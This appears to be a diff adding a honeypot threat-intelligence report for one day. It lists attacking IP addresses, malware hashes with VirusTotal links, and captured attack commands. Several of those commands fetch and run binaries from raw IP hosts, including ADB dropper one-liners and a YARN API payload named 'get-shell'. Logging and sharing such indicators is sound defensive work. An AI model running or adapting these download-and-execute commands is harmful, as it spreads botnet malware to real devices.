@@ -1,0 +1,22 @@
+Top 5 IPs for 2023-12-09:
+222.230.177.55
+46.19.139.138
+166.141.88.103
+223.13.27.94
+125.25.184.233
+
+Malware seen: 
+Hash: a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+https://www.virustotal.com/gui/file/a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3
+Hash: 75acf687420aeaf8df3a2dfc6ea14c62c61b06bfaec6cb055637a827f7fb747b
+https://www.virustotal.com/gui/file/75acf687420aeaf8df3a2dfc6ea14c62c61b06bfaec6cb055637a827f7fb747b
+Hash: df4646e1bf9615d94a8304f3b20a9fb828ff489b16e5d6dc4673d24fa6a98f5c
+https://www.virustotal.com/gui/file/df4646e1bf9615d94a8304f3b20a9fb828ff489b16e5d6dc4673d24fa6a98f5c
+
+cd /data/local/tmp/; busybox wget http://93.123.85.124/w.sh; sh w.sh; curl http://93.123.85.124/c.sh; sh c.sh
+cd /data/local/tmp/; rm *; busybox wget http://176.97.210.211/lmao.arm7; chmod 777 lmao.arm7; ./lmao.arm7
+killall -9 arm7; killall -9 arm7.s; cd /data/local/tmp/; rm *; busybox wget http://45.95.147.171/arm7; chmod 777 arm7; ./arm7 ADB-3
+
+
+
+{"application-id": "", "application-name": "get-shell", "am-container-spec": {"commands": {"command": "cd /tmp; rm -rf skid.x86; wget http://193.222.96.26/skid.x86; curl http://193.222.96.26/skid.x86 --output skid.x86; chmod 777 skid.x86; ./skid.x86 Yarn;"}}, "application-type": "YARN"}
